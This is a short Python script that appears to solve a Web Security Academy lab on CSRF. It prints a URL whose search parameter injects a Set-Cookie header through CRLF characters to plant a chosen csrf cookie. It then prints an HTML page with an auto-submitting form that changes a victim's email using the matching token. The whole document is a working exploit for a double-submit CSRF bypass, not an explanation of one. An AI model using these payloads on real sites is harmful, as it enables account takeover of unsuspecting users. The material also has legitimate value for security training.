LAB_ID = "???"

csrf = 'faposjwekfadoj9h39ha087d'
print("first stage (sets the 'csrf' cookie):")
print(f"https://{LAB_ID}.web-security-academy.net/?" +
      f"search=xxx%3B+Secure%3B+HttpOnly%3B%0D%0A" +
      f"Set-Cookie%3A+csrf%3D{csrf}%3B+Secure%3B+HttpOnly")
print("second stage (csrf attack form with the same csrf token):")
print(f"""
<html>
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
    <input type="hidden" name="csrf" value="{csrf}" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
""")
